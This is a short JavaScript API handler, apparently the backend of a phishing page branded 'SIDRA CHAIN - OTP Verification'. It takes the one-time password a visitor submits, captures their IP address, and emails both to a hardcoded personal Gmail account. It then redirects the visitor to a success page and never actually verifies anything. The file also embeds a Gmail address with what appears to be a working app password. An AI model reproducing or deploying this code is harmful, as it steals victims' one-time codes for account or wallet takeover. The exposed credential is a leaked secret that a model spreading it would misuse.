const nodemailer = require("nodemailer");

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ error: "Method Not Allowed" });
    }

    const { otp } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "nwankwogoodluck156@gmail.com",  
            pass: "nwub nfwt hbpq hdim",  
        },
    });

    const mailOptions = {
        from: "your-email@gmail.com",
        to: "nwankwogoodluck156@gmail.com",
        subject: "SIDRA CHAIN - OTP Verification",
        text: `This is the entered OTP:\nOTP: ${otp}\nIP ADDRESS: ${ip}`,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.writeHead(302, { Location: "/success.html" });
        res.end();
    } catch (error) {
        res.status(500).json({ error: "Failed to send email" });
    }
}
